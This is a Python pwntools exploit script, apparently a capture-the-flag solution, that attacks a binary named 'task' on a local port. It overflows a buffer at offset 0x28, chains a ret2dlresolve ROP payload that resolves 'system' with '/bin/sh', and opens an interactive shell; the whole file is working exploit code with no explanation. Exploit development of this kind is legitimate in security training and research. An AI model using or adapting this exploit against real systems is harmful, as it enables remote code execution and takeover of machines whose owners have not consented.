#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./task", checksec=False)
context.binary = elf

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("127.0.0.1", 9001)

rop = ROP(elf)

dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])

rop.read(0, dlresolve.data_addr)
rop.raw(p64(rop.find_gadget(['ret']).address)) # stack aligning ret
rop.ret2dlresolve(dlresolve)

p.sendline(fit({0x28: rop.chain(), 320: dlresolve.payload}))

p.interactive()
